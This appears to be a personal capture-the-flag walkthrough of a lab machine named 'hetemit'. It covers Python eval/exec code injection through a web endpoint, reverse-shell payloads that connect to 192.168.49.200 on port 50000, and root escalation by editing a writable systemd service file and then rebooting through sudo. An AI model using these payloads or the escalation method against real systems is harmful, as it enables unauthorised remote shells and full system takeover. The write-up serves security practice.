### Hints since I'm in rush

There are two webapps running on non-standard ports.

Focus on the /verify endpoint. Try different inputs in the code parameter.

Look at writable files and check your sudo permissions. 

### Webapps
`?code=XXX` first then change/covert to POST

1+1 to discover the SSRF

##### Python stuff
https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1

Exec()

exec() is similar to eval() as they both have the ability to execute Python code from a given string input. The following program could be exploited in the same way as above:
```
def addition(a, b):
  return exec("%s + %s" % (a, b))addition(request.json['a'], request.json['b'])
  ```

```payloads for Eval()
"a":"__import__('os').system('bash -i >& /dev/tcp/192.168.49.200/50000 0>&1')#", "b":"2"
"__import__('os').system('bash -i >& /dev/tcp/192.168.49.200/50000 0>&1')#"
__import__('os').system('bash -i >& /dev/tcp/192.168.49.200/50000 0>&1')#
__import__('os').system('bash -i >& /dev/tcp/192.168.49.200/50000 0>&1') <--- working
```

### Foothold

```bash
[cmeeks@hetemit restjson_hetemit]$ pwd
pwd
/home/cmeeks/restjson_hetemit
```

### sudo -l
https://security.stackexchange.com/questions/246288/sudo-usr-sbin-halt-usr-sbin-reboot-usr-sbin-poweroff-how-to-leverag

The answer can be simple. Just like how you're doing privilege escalation by using cronjobs. You find a writable file and put your payload in then wait.

`sudo -l` gives "/usr/sbin/halt", "/usr/sbin/reboot", "/usr/sbin/poweroff" that means one thing here. You can reboot the machine as ROOT.

So, you need to look for some writable configuration files that trigger when start/reboot. `find . -writable` on /etc or just run linpeas.

The file is most likely owned by root. But read and writable in our favour. e.g.
```
ls -lh /etc/systemd/system/some.service
-rw-rw-r-- 1 root rob /etc/systemd/system/some.service
```
Maybe the file is running by root, then you find the exec line add `ExecXXX: you evil payload here`.

Or change the runner of it if that's not triggered by root in default. `User: low_level_user -> root`

### Find all files that are writable by the current user
```bash
find . -writable
```
```
ls -lh /etc/systemd/system/pythonapp.service
-rw-rw-r-- 1 root cmeeks 299 Sep 19 03:17 /etc/systemd/system/pythonapp.service
```

You have write privileges over /etc/systemd/system/pythonapp.service

re-shell got root